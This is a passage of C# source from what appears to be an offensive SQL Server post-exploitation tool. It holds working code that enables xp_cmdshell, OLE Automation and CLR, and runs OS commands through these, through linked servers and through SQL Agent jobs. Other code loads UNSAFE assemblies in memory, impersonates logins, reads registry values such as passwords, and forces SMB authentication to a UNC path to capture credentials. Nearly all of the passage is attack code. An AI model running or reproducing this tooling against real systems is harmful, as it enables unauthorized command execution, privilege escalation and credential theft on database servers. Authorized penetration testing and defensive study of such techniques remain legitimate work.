            if (s.Contains(",") || s.Contains("\"") || s.Contains("\r") || s.Contains("\n"))
            {
                return $"\"{s}\"";
            }
            return s;
        }
        #endregion
        #region xp_cmdshell & file upload/download

        private static bool IsLocalhostConnection(string server)
        {
            if (string.IsNullOrEmpty(server)) return false;

           
            string host = server.Split('\\')[0].Split(',')[0].ToLower();

            
            var localhostIdentifiers = new List<string> {
        "localhost",
        "127.0.0.1",
        "::1",
        Environment.MachineName.ToLower()
    };

            return localhostIdentifiers.Contains(host);
        }
        static void LaunchProcessAsUser(Config cfg)
        {
            string domain = string.IsNullOrEmpty(cfg.Domain) ? "." : cfg.Domain;
            string executablePath = Process.GetCurrentProcess().MainModule.FileName;

            
            StringBuilder cmdLine = new StringBuilder();
            cmdLine.Append("\"").Append(executablePath).Append("\"");

            bool skipNext = false;
            foreach (var arg in Environment.GetCommandLineArgs().Skip(1))
            {
                if (skipNext)
                {
                    skipNext = false;
                    continue;
                }

                if (arg.Equals("--runas", StringComparison.OrdinalIgnoreCase) ||
                    arg.Equals("--runas-pass", StringComparison.OrdinalIgnoreCase))
                {
                    skipNext = true;
                    continue;
                }

                cmdLine.Append(" \"").Append(arg.Replace("\"", "\\\"")).Append("\"");
            }

            
            string finalCmdLine = cmdLine.ToString().Replace("--kerberos", "");

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            si.cb = Marshal.SizeOf(si);

            bool result = CreateProcessWithLogonW(
                cfg.RunasUser,
                domain,
                cfg.RunasPassword,
                LOGON_WITH_PROFILE,
                null,
                finalCmdLine,
                CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                0,
                null,
                ref si,
                out pi);

            if (!result)
            {
                int error = Marshal.GetLastWin32Error();
                throw new Win32Exception(error, "Failed to create process with logon");
            }

           
            WaitForSingleObject(pi.hProcess, INFINITE);

             
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        static async Task TryEnableXpCmdShell(SqlConnection conn)
        {
            Console.WriteLine("[*] Enabling xp_cmdshell (requires sysadmin)...");
            await ExecuteNonQueryWithReport(conn, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
            await ExecuteNonQueryWithReport(conn, "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
        }

        static async Task ExecClrFromMemory(SqlConnection conn, string assemblyPath, string className, string methodName, string[] parameters)
        {
             
            string actualPath = assemblyPath.Trim('"');
            Console.WriteLine($"[*] Executing CLR in memory: {methodName} from {actualPath}");

            
            if (!File.Exists(actualPath))
            {
                Console.WriteLine($"[-] Assembly file not found: {actualPath}");
                return;
            }

            try
            {
                
                byte[] assemblyBytes = File.ReadAllBytes(actualPath);
                await ExecClrFromMemoryBytes(conn, assemblyBytes, className, methodName, parameters);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] In-memory CLR execution failed: {ex.Message}");
            }
        }

        static async Task ExecClrFromMemoryBytes(SqlConnection conn, byte[] assemblyBytes, string className, string methodName, string[] parameters)
        {
            string randomId = Guid.NewGuid().ToString("N");
            string tempAssemblyName = $"clr_temp_{randomId}";
            string tempProcName = $"clr_temp_proc_{randomId}";
            string hashHex = null;

            try
            {
              
                string assemblyHex = BitConverter.ToString(assemblyBytes).Replace("-", "");

              
                var version = await GetSqlServerVersion(conn);
                bool isSql2017OrNewer = version.Major >= 14;

                
                if (isSql2017OrNewer)
                {
                    using (SHA512 sha = SHA512.Create())
                    {
                        byte[] hashBytes = sha.ComputeHash(assemblyBytes);
                        hashHex = BitConverter.ToString(hashBytes).Replace("-", "");

                        await ExecuteNonQueryAsync(conn, $@"
                    IF NOT EXISTS (SELECT * FROM sys.trusted_assemblies WHERE hash = 0x{hashHex})
                    BEGIN
                        EXEC sp_add_trusted_assembly @hash = 0x{hashHex};
                    END");
                    }
                }
                else
                {
                    string currentDb = conn.Database;
                    await ExecuteNonQueryAsync(conn, $@"
                IF (SELECT is_trustworthy_on FROM sys.databases WHERE name = '{currentDb}') = 0
                BEGIN
                    ALTER DATABASE [{currentDb}] SET TRUSTWORTHY ON;
                END");
                }
 
                await ExecuteNonQueryAsync(conn, $@"
            CREATE ASSEMBLY [{tempAssemblyName}] 
            FROM 0x{assemblyHex} 
            WITH PERMISSION_SET = UNSAFE;");

                 
                string paramDeclarations = string.Join(", ",
                    Enumerable.Range(0, parameters.Length)
                    .Select(i => $"@p{i} NVARCHAR(MAX)"));

                string paramList = string.Join(", ",
                    Enumerable.Range(0, parameters.Length)
                    .Select(i => $"@p{i}"));

                await ExecuteNonQueryAsync(conn, $@"
            CREATE PROCEDURE [dbo].[{tempProcName}]
                {paramDeclarations}
            AS EXTERNAL NAME [{tempAssemblyName}].[{className}].[{methodName}];");

                
                try
                {
                    string execSql = $"EXEC [dbo].[{tempProcName}] {paramList}";
                    using (var cmd = new SqlCommand(execSql, conn))
                    {
                        for (int i = 0; i < parameters.Length; i++)
                        {
                            cmd.Parameters.AddWithValue($"@p{i}", parameters[i]);
                        }

                        using (var rdr = await cmd.ExecuteReaderAsync())
                        {
                            while (await rdr.ReadAsync())
                            {
                                for (int i = 0; i < rdr.FieldCount; i++)
                                {
                                    Console.WriteLine(rdr.IsDBNull(i) ? "" : rdr.GetValue(i).ToString());
                                }
                            }
                        }
                    }
                }
                finally
                {
                   
                    await ExecuteNonQueryIgnoreError(conn, $"DROP PROCEDURE IF EXISTS [dbo].[{tempProcName}];");
                }

                Console.WriteLine($"[+] In-memory CLR execution completed");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] CLR execution failed: {ex.Message}");
            }
            finally
            {
               
                await ExecuteNonQueryIgnoreError(conn, $"DROP ASSEMBLY IF EXISTS [{tempAssemblyName}];");

                
                if (!string.IsNullOrEmpty(hashHex))
                {
                    await ExecuteNonQueryIgnoreError(conn, $@"
                IF EXISTS (SELECT * FROM sys.trusted_assemblies WHERE hash = 0x{hashHex})
                BEGIN
                    EXEC sp_drop_trusted_assembly @hash = 0x{hashHex};
                END");
                }
            }
        }
        static async Task TryDisableXpCmdShell(SqlConnection conn)
        {
            Console.WriteLine("[*] Disabling xp_cmdshell...");
            await ExecuteNonQueryWithReport(conn, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
            await ExecuteNonQueryWithReport(conn, "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;");
        }
        static async Task ExecXpCmdShell(SqlConnection conn, string cmd)
        {
            try
            {
                using (var c = new SqlCommand("EXEC xp_cmdshell @c", conn))
                {
                    c.Parameters.AddWithValue("@c", cmd);
                    using (var rdr = await c.ExecuteReaderAsync())
                    {
                        while (await rdr.ReadAsync())
                            Console.WriteLine(rdr.IsDBNull(0) ? "" : rdr.GetValue(0).ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] xp_cmdshell error: " + ex.Message);
            }
        }
        static async Task UploadFileToTable(SqlConnection conn, string localPath, string table)
        {
            if (!File.Exists(localPath)) { Console.WriteLine("[-] File not found: " + localPath); return; }
            var data = File.ReadAllBytes(localPath);
            Console.WriteLine($"[*] Uploading {data.Length} bytes to table {table} (expects columns content varbinary(max), filename nvarchar)");
            using (var cmd = new SqlCommand($"INSERT INTO {table} (content, filename) VALUES (@b, @fn)", conn))
            {
                cmd.Parameters.Add("@b", SqlDbType.VarBinary, -1).Value = data;
                cmd.Parameters.AddWithValue("@fn", Path.GetFileName(localPath));
                var n = await cmd.ExecuteNonQueryAsync();
                Console.WriteLine($"[+] Inserted {n} rows.");
            }
        }
        static async Task DownloadBinary(SqlConnection conn, string scalarQuery, string localFile)
        {
            try
            {
                using (var cmd = new SqlCommand(scalarQuery, conn))
                {
                    var val = await cmd.ExecuteScalarAsync();
                    if (val is byte[] bytes)
                    {
                        File.WriteAllBytes(localFile, bytes);
                        Console.WriteLine($"[+] Wrote {bytes.Length} bytes to {localFile}");
                    }
                    else
                    {
                        Console.WriteLine("[-] Query did not return binary data. Got: " + (val?.GetType().Name ?? "null"));
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Download error: " + ex.Message);
            }
        }
        static async Task ExecuteNonQueryWithReport(SqlConnection conn, string sql)
        {
            try
            {
                using (var cmd = new SqlCommand(sql, conn))
                {
                    var n = await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine("[+] Executed. Affected rows: " + n);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
            }
        }
        static async Task<object> ExecuteScalarAsync(SqlConnection conn, string sql)
        {
            using (var cmd = new SqlCommand(sql, conn))
            {
                return await cmd.ExecuteScalarAsync();
            }
        }

        static async Task ListLinkedServers(SqlConnection conn)
        {
            try
            {
                Console.WriteLine("[*] Listing linked servers...");

                string query;

                
                try
                {
                    query = @"
            SELECT 
                name AS [ServerName],
                product AS [Product],
                provider AS [Provider],
                data_source AS [DataSource],
                catalog AS [Catalog]
            FROM sys.servers
            WHERE server_id > 0";

                    var tbl = await ExecuteQueryReturnTable(conn, query);
                    if (tbl.Count > 0)
                    {
                        Console.WriteLine($"[+] Found {tbl.Count} linked server(s):");
                        PrintTable(tbl);
                        return;
                    }
                }
                catch
                {
                     
                }

               
                try
                {
                    query = @"
            SELECT 
                srvname AS [ServerName],
                srvproduct AS [Product],
                providername AS [Provider],
                datasource AS [DataSource]
            FROM sys.sysservers
            WHERE isremote = 1";

                    var tbl = await ExecuteQueryReturnTable(conn, query);
                    if (tbl.Count > 0)
                    {
                        Console.WriteLine($"[+] Found {tbl.Count} linked server(s):");
                        PrintTable(tbl);
                        return;
                    }
                }
                catch
                {
                    
                }

                 Console.WriteLine("[i] No linked servers found.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error listing linked servers: {ex.Message}");
            }
        }
        static async Task<Version> GetSqlServerVersion(SqlConnection conn)
        {
            try
            {
                var versionString = await ExecuteScalarAsync(conn, "SELECT SERVERPROPERTY('ProductVersion')") as string;
                return string.IsNullOrEmpty(versionString) ? new Version(9, 0) : new Version(versionString);
            }
            catch
            {
                return new Version(9, 0);  
            }
        }
        static async Task ExecuteViaLinkedServer(SqlConnection conn, string linkedServer, string command)
        {
            try
            {
                Console.WriteLine($"[*] Executing command via linked server '{linkedServer}': {command}");
                 try
                {
                    var openQuery = $"SELECT * FROM OPENQUERY([{linkedServer}], 'EXEC master..xp_cmdshell ''{command.Replace("'", "''")}''')";
                    var tbl = await ExecuteQueryReturnTable(conn, openQuery);
                    PrintTable(tbl);
                    return;
                }
                catch
                {
                 }

                var directExec = $"EXEC [{linkedServer}].master.dbo.xp_cmdshell '{command.Replace("'", "''")}'";
                await ExecuteNonQueryWithReport(conn, directExec);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Linked server execution failed: {ex.Message}");
            }
        }

        static async Task ImpersonateLogin(SqlConnection conn, string login)
        {
            try
            {
                Console.WriteLine($"[*] Attempting to impersonate login: {login}");

                var checkSql = $@"
            SELECT COUNT(*) 
            FROM sys.server_principals 
            WHERE name = '{login.Replace("'", "''")}'
              AND is_disabled = 0";
                var exists = (int)(await new SqlCommand(checkSql, conn).ExecuteScalarAsync()) > 0;
                if (!exists)
                {
                    Console.WriteLine($"[-] Login '{login}' doesn't exist or is disabled");
                    return;
                }
                await ExecuteNonQueryWithReport(conn, $"EXECUTE AS LOGIN = '{login.Replace("'", "''")}'");
                Console.WriteLine($"[+] Successfully impersonated '{login}'");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Impersonation failed: {ex.Message}");
            }
        }
        static async Task RevertImpersonation(SqlConnection conn)
        {
            try
            {
                Console.WriteLine("[*] Reverting impersonation...");
                await ExecuteNonQueryWithReport(conn, "REVERT");
                Console.WriteLine("[+] Successfully reverted security context");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Revert failed: {ex.Message}");
            }
        }
        static async Task CreateAgentJob(SqlConnection conn, string jobName, string command)
        {
            try
            {
                Console.WriteLine($"[*] Creating SQL Agent job: {jobName}");

                var agentStatus = await ExecuteScalarAsync(conn,
                    "SELECT status_desc FROM sys.dm_server_services WHERE servicename LIKE 'SQL Server Agent%'");
                if (agentStatus?.ToString() != "Running")
                {
                    Console.WriteLine("[-] SQL Agent service is not running");
                    return;
                }

                var sql = $@"
            USE msdb;
            EXEC dbo.sp_add_job
                @job_name = N'{jobName.Replace("'", "''")}',
                @delete_level = 1;  -- Delete after success
            EXEC sp_add_jobstep
                @job_name = N'{jobName.Replace("'", "''")}',
                @step_name = N'ExecuteCommand',
                @subsystem = N'CmdExec',
                @command = N'{command.Replace("'", "''")}';
            EXEC dbo.sp_add_jobserver
                @job_name = N'{jobName.Replace("'", "''")}',
                @server_name = N'(local)';
            EXEC dbo.sp_start_job 
                @job_name = N'{jobName.Replace("'", "''")}';";
                await ExecuteNonQueryWithReport(conn, sql);
                Console.WriteLine($"[+] Job created and started successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Job creation failed: {ex.Message}");
            }
        }
        static async Task ListAgentJobs(SqlConnection conn)
        {
            try
            {
                Console.WriteLine("[*] Listing SQL Agent jobs...");
                var sql = @"
            SELECT job_id, name, enabled, date_created, date_modified 
            FROM msdb.dbo.sysjobs";
                var tbl = await ExecuteQueryReturnTable(conn, sql);
                PrintTable(tbl);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error listing jobs: {ex.Message}");
            }
        }
        static async Task DeleteAgentJob(SqlConnection conn, string jobName)
        {
            try
            {
                Console.WriteLine($"[*] Deleting SQL Agent job: {jobName}");
                await ExecuteNonQueryWithReport(conn,
                    $"USE msdb; EXEC dbo.sp_delete_job @job_name = N'{jobName.Replace("'", "''")}'");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Job deletion failed: {ex.Message}");
            }
        }
        static async Task RunAgentJob(SqlConnection conn, string jobName)
        {
            try
            {
                Console.WriteLine($"[*] Starting SQL Agent job: {jobName}");
                await ExecuteNonQueryWithReport(conn,
                    $"USE msdb; EXEC dbo.sp_start_job @job_name = N'{jobName.Replace("'", "''")}'");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Job start failed: {ex.Message}");
            }
        }
        #endregion
        #region Helper Execution Methods
        static async Task ReadRegistryValue(SqlConnection conn, string hive, string keyPath, string valueName)
        {
            try
            {
                Console.WriteLine($"[*] Reading registry: {hive}\\{keyPath}\\{valueName}");


                try
                {
                    var sql = $@"
            DECLARE @value SQL_VARIANT;
            EXEC master.dbo.xp_regread 
                @rootkey = '{hive}', 
                @key = '{keyPath.Replace("'", "''")}', 
                @value_name = '{valueName.Replace("'", "''")}', 
                @value = @value OUTPUT;
            SELECT @value AS Value;";

                    var result = await ExecuteQueryReturnTable(conn, sql);
                    PrintTable(result);
                    return;
                }
                catch { /* Fall through to next attempt */ }


                try
                {
                    var sql = $@"
            DECLARE @value SQL_VARIANT;
            EXEC master.dbo.xp_instance_regread 
                @rootkey = '{hive}', 
                @key = '{keyPath.Replace("'", "''")}', 
                @value_name = '{valueName.Replace("'", "''")}', 
                @value = @value OUTPUT;
            SELECT @value AS Value;";

                    var result = await ExecuteQueryReturnTable(conn, sql);
                    PrintTable(result);
                    return;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Both registry read methods failed: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Registry read error: {ex.Message}");
            }
        }

        static async Task ListRegistryValues(SqlConnection conn, string hive, string keyPath)
        {
            try
            {

                keyPath = keyPath.Trim('"');
                Console.WriteLine($"[*] Enumerating registry: {hive}\\{keyPath}");


                try
                {
                    var verifySql = $@"
            DECLARE @subkeys TABLE (subkey NVARCHAR(255));
            BEGIN TRY
                INSERT INTO @subkeys
                EXEC master.dbo.xp_regread
                    @rootkey = '{hive}',
                    @key = '{keyPath.Replace("'", "''")}',
                    @value_name = NULL;
                
                IF EXISTS (SELECT 1 FROM @subkeys)
                    SELECT 'Successfully accessed registry key' AS [Status];
                ELSE
                    SELECT 'Key exists but has no subkeys' AS [Status];
            END TRY
            BEGIN CATCH
                SELECT 'Failed to access key: ' + ERROR_MESSAGE() AS [Status];
            END CATCH";

                    var verifyResult = await ExecuteQueryReturnTable(conn, verifySql);
                    PrintTable(verifyResult);


                    if (verifyResult.Count > 0 && verifyResult[0]["Status"].ToString().Contains("Failed"))
                        return;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Key verification failed: {ex.Message}");
                    return;
                }


                try
                {
                    Console.WriteLine("[*] Attempting xp_regreadmulti...");
                    var sql = $@"
            DECLARE @values TABLE (
                value_name NVARCHAR(255),
                value_data SQL_VARIANT
            );
            
            BEGIN TRY
                INSERT INTO @values
                EXEC master.dbo.xp_regreadmulti
                    @rootkey = '{hive}',
                    @key = '{keyPath.Replace("'", "''")}';
                
                SELECT 
                    value_name AS [Value Name],
                    CAST(value_data AS NVARCHAR(MAX)) AS [Value],
                    SQL_VARIANT_PROPERTY(value_data, 'BaseType') AS [Type]
                FROM @values
                WHERE value_data IS NOT NULL;
            END TRY
            BEGIN CATCH
                SELECT 'xp_regreadmulti failed: ' + ERROR_MESSAGE() AS [Error];
            END CATCH";

                    var result = await ExecuteQueryReturnTable(conn, sql);
                    if (result.Count > 0)
                    {
                        if (result[0].ContainsKey("Error"))
                        {
                            Console.WriteLine($"[-] {result[0]["Error"]}");
                        }
                        else
                        {
                            PrintTable(result);
                            return;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] xp_regreadmulti error: {ex.Message}");
                }


                Console.WriteLine("[*] Checking important registry values...");

                var importantValues = new[]
                {
            "AuditLevel", "BackupDirectory", "DefaultData",
            "DefaultLog", "LoginMode", "MasterLoginMode",
            "Password", "Pwd", "SaPwd", "ServiceAccount",
            "SQLPath", "SQLDataRoot", "Config", "Settings",
            "SuperSocketNetLib\\ProtocolList", "SuperSocketNetLib\\Encrypt"
        };

                bool foundAny = false;

                foreach (var val in importantValues)
                {
                    try
                    {
                        var readSql = $@"
                DECLARE @value SQL_VARIANT;
                BEGIN TRY
                    EXEC master.dbo.xp_regread 
                        @rootkey = '{hive}', 
                        @key = '{keyPath.Replace("'", "''")}', 
                        @value_name = '{val.Replace("'", "''")}', 
                        @value = @value OUTPUT;
                    
                    IF @value IS NOT NULL
                        SELECT 
                            '{val}' AS [Value Name],
                            CAST(@value AS NVARCHAR(MAX)) AS [Value],
                            SQL_VARIANT_PROPERTY(@value, 'BaseType') AS [Type];
                END TRY
                BEGIN CATCH
                    -- Skip errors for individual values
                END CATCH";

                        var result = await ExecuteQueryReturnTable(conn, readSql);
                        if (result.Count > 0)
                        {
                            PrintTable(result);
                            foundAny = true;
                        }
                    }
                    catch
                    {

                    }
                }

                if (!foundAny)
                {
                    Console.WriteLine("[!] No registry values found - possible causes:");
                    Console.WriteLine("    1. Insufficient permissions (need sysadmin)");
                    Console.WriteLine("    2. Key doesn't exist on this SQL Server version");
                    Console.WriteLine("    3. Registry functions disabled on this instance");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Critical error: {ex.Message}");
            }
        }

        static async Task ForceUncSmbAuth(SqlConnection conn, string uncPath)
        {
            try
            {
                if (!uncPath.StartsWith(@"\\"))
                {
                    Console.WriteLine("[-] UNC path must start with \\\\");
                    return;
                }

                Console.WriteLine($"[*] Attempting to force SMB auth to {uncPath}");


                try
                {
                    await ExecuteNonQueryWithReport(conn,
                        $"EXEC master.sys.xp_dirtree '{uncPath.Replace("'", "''")}', 1, 1");
                    Console.WriteLine($"[+] xp_dirtree executed against {uncPath}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] xp_dirtree failed: {ex.Message}");
                }


                try
                {

                    var adHocEnabled = await ExecuteScalarAsync(conn,
                        "SELECT value_in_use FROM sys.configurations WHERE name = 'Ad Hoc Distributed Queries'") as int?;

                    bool wasEnabled = adHocEnabled == 1;
                    bool weEnabled = false;

                    if (!wasEnabled)
                    {
                        Console.WriteLine("[*] Ad Hoc Distributed Queries are disabled - attempting to enable");
                        try
                        {
                            await ExecuteNonQueryWithReport(conn,
                                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
                            await ExecuteNonQueryWithReport(conn,
                                "EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;");
                            weEnabled = true;
                            Console.WriteLine("[+] Ad Hoc Distributed Queries enabled successfully");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[-] Failed to enable Ad Hoc Distributed Queries: {ex.Message}");
                        }
                    }

                    try
                    {

                        string randomFile = $"{Guid.NewGuid()}.txt";
                        string filePath = $"{uncPath}\\{randomFile}";

                        Console.WriteLine($"[*] Attempting file access via OPENROWSET: {filePath}");

                        var sql = $@"
                SELECT * FROM OPENROWSET(
                    'Microsoft.ACE.OLEDB.12.0',
                    'Text;Database={uncPath.Replace("'", "''")};',
                    'SELECT * FROM [{randomFile}]'
                )";

                        await ExecuteNonQueryWithReport(conn, sql);
                        Console.WriteLine($"[+] OPENROWSET file access attempted");
                    }
                    finally
                    {
                        if (weEnabled)
                        {
                            try
                            {
                                Console.WriteLine("[*] Reverting Ad Hoc Distributed Queries setting");
                                await ExecuteNonQueryWithReport(conn,
                                    "EXEC sp_configure 'Ad Hoc Distributed Queries', 0; RECONFIGURE;");
                                await ExecuteNonQueryWithReport(conn,
                                    "EXEC sp_configure 'show advanced options', 0; RECONFIGURE;");
                                Console.WriteLine("[+] Ad Hoc Distributed Queries disabled");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"[-] Failed to disable Ad Hoc Distributed Queries: {ex.Message}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] OPENROWSET file access failed: {ex.Message.Split('\n')[0]}");
                }


                try
                {
                    string randomFile = $"{Guid.NewGuid()}.txt";
                    string filePath = $"{uncPath}\\{randomFile}";

                    Console.WriteLine($"[*] Attempting xp_fileexist: {filePath}");
                    await ExecuteNonQueryWithReport(conn,
                        $"EXEC master.sys.xp_fileexist '{filePath.Replace("'", "''")}'");
                    Console.WriteLine($"[+] xp_fileexist executed");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] xp_fileexist failed: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] UNC injection failed: {ex.Message}");
            }
        }

        #endregion
        #region OLE Automation
        static async Task EnableOleAutomation(SqlConnection conn)
        {
            Console.WriteLine("[*] Enabling OLE Automation Procedures (requires sysadmin)...");
            string sql = @"
                EXEC sp_configure 'show advanced options', 1;  
                RECONFIGURE;  
                EXEC sp_configure 'Ole Automation Procedures', 1;  
                RECONFIGURE;";
            try
            {
                using (var cmd = new SqlCommand(sql, conn))
                {
                    var n = await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine("[+] OLE Automation Procedures enabled successfully.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to enable OLE Automation: " + ex.Message);
            }
        }
        static async Task DisableOleAutomation(SqlConnection conn)
        {
            Console.WriteLine("[*] Disabling OLE Automation Procedures...");
            string sql = @"
                EXEC sp_configure 'show advanced options', 1;  
                RECONFIGURE;  
                EXEC sp_configure 'Ole Automation Procedures', 0;  
                RECONFIGURE;";
            try
            {
                using (var cmd = new SqlCommand(sql, conn))
                {
                    var n = await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine("[+] OLE Automation Procedures disabled successfully.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to disable OLE Automation: " + ex.Message);
            }
        }
        static async Task RunOleCommand(SqlConnection conn, string command)
        {
            Console.WriteLine($"[*] Running command via OLE Automation: {command}");
            string sql = $@"
                DECLARE @shell INT;  
                EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;  
                EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c {command}';  
                EXEC sp_OADestroy @shell;";
            try
            {
                using (var cmd = new SqlCommand(sql, conn))
                {
                    await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine("[+] Command execution initiated via OLE Automation.");
                    Console.WriteLine("  Note: This is asynchronous - command runs in background");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to execute command via OLE Automation: " + ex.Message);
            }
        }
        #endregion
        #region CLR Features
        static async Task EnableClr(SqlConnection conn)
        {
            Console.WriteLine("[*] Enabling CLR integration (requires sysadmin)...");
            string sql = @"
                EXEC sp_configure 'show advanced options', 1;  
                RECONFIGURE;  
                EXEC sp_configure 'clr enabled', 1;  
                RECONFIGURE;";
            try
            {
                using (var cmd = new SqlCommand(sql, conn))
                {
                    var n = await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine("[+] CLR integration enabled successfully.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to enable CLR: " + ex.Message);
            }
        }
        static async Task DisableClr(SqlConnection conn)
        {
            Console.WriteLine("[*] Disabling CLR integration...");
            string sql = @"
                EXEC sp_configure 'show advanced options', 1;  
                RECONFIGURE;  
                EXEC sp_configure 'clr enabled', 0;  
                RECONFIGURE;";
            try
            {
                using (var cmd = new SqlCommand(sql, conn))
                {
                    var n = await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine("[+] CLR integration disabled successfully.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to disable CLR: " + ex.Message);
            }
        }
        static string[] ParseQuotedParameters(string input)
        {
            var parameters = new List<string>();
            bool inQuotes = false;
            var current = new StringBuilder();
            for (int i = 0; i < input.Length; i++)
            {
                char c = input[i];
                if (c == '"')
                {
                    inQuotes = !inQuotes;
                }
                else if (c == ' ' && !inQuotes)
                {
                    if (current.Length > 0)
                    {
                        parameters.Add(current.ToString());
                        current.Clear();
                    }
                }
                else
                {
                    current.Append(c);
                }
            }
            if (current.Length > 0)
            {
                parameters.Add(current.ToString());
            }

            return parameters.Select(p => p.Trim('"')).ToArray();
        }
        static async Task ExecClrInMemory(SqlConnection conn, string assemblyPath, string className, string methodName, string[] parameters)
        {

            string actualPath = assemblyPath.Trim('"');
            Console.WriteLine($"[*] Executing CLR in memory: {methodName} from {actualPath}");

            if (!File.Exists(actualPath))
            {
                Console.WriteLine($"[-] Assembly file not found: {actualPath}");
                return;
            }
            string randomId = Guid.NewGuid().ToString("N");
            string tempAssemblyName = $"clr_temp_{randomId}";
            string tempProcName = $"clr_temp_proc_{randomId}";
            string hashHex = null;
            try
            {

                byte[] assemblyBytes = File.ReadAllBytes(actualPath);
                string assemblyHex = BitConverter.ToString(assemblyBytes).Replace("-", "");

                string versionString;
                using (var cmd = new SqlCommand("SELECT SERVERPROPERTY('ProductVersion')", conn))
                {
                    versionString = (await cmd.ExecuteScalarAsync()) as string;
                }
                Version version = string.IsNullOrEmpty(versionString) ? new Version(11, 0) : new Version(versionString);
                int majorVersion = version.Major;

                if (majorVersion < 14) 
                {
                    string currentDb = conn.Database;
                    using (var cmd = new SqlCommand(
                        $"SELECT is_trustworthy_on FROM sys.databases WHERE name = '{currentDb}'", conn))
                    {
                        var result = await cmd.ExecuteScalarAsync();
                        bool isTrustworthy = result != null && (int)result == 1;
                        if (!isTrustworthy)
                        {
                            await ExecuteNonQueryAsync(conn, $"ALTER DATABASE [{currentDb}] SET TRUSTWORTHY ON;");
                        }
                    }
                }
                else  
                {
                    using (SHA512 sha = SHA512.Create())
                    {
                        byte[] hashBytes = sha.ComputeHash(assemblyBytes);
                        hashHex = BitConverter.ToString(hashBytes).Replace("-", "");
                        await ExecuteNonQueryAsync(conn, $@"
                    IF NOT EXISTS (SELECT * FROM sys.trusted_assemblies WHERE hash = 0x{hashHex})
                    BEGIN
                        EXEC sp_add_trusted_assembly @hash = 0x{hashHex};
                    END");
                    }
                }

                await ExecuteNonQueryAsync(conn, $@"
            CREATE ASSEMBLY [{tempAssemblyName}] 
            FROM 0x{assemblyHex} 
            WITH PERMISSION_SET = UNSAFE;");

                await ExecuteNonQueryAsync(conn, $@"
            CREATE PROCEDURE [dbo].[{tempProcName}]
                {BuildParamDeclarations(parameters)}
            AS EXTERNAL NAME [{tempAssemblyName}].[{className}].[{methodName}];");

                try
                {
                    string execSql = $"EXEC [dbo].[{tempProcName}] {BuildParamList(parameters)}";
                    using (var cmd = new SqlCommand(execSql, conn))
                    {
                        for (int i = 0; i < parameters.Length; i++)
                        {
                            cmd.Parameters.AddWithValue($"@p{i}", parameters[i]);
                        }
                        using (var rdr = await cmd.ExecuteReaderAsync())
                        {
                            while (await rdr.ReadAsync())
                            {
                                for (int i = 0; i < rdr.FieldCount; i++)
                                {
                                    Console.WriteLine(rdr.IsDBNull(i) ? "" : rdr.GetValue(i).ToString());
                                }
                            }
                        }
                    }
                }
                finally
                {

                    await ExecuteNonQueryIgnoreError(conn, $"DROP PROCEDURE IF EXISTS [dbo].[{tempProcName}];");
                }
                Console.WriteLine($"[+] In-memory CLR execution completed");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] In-memory CLR execution failed: {ex.Message}");
            }
            finally
            {

                await ExecuteNonQueryIgnoreError(conn, $"DROP ASSEMBLY IF EXISTS [{tempAssemblyName}];");

                if (!string.IsNullOrEmpty(hashHex))
                {
                    await ExecuteNonQueryIgnoreError(conn, $@"
                IF EXISTS (SELECT * FROM sys.trusted_assemblies WHERE hash = 0x{hashHex})
                BEGIN
                    EXEC sp_drop_trusted_assembly @hash = 0x{hashHex};
                END");
                }
            }
        }
        #region CLR Assembly Removal
        static async Task RemoveAssembly(SqlConnection conn, string assemblyName)
        {
            Console.WriteLine($"[*] Removing assembly: {assemblyName}");
            try
            {
                // Get all dependent objects using version-compatible query
                string getDependentsSql = $@"
            SELECT 
                OBJECT_NAME(mod.object_id) AS object_name,
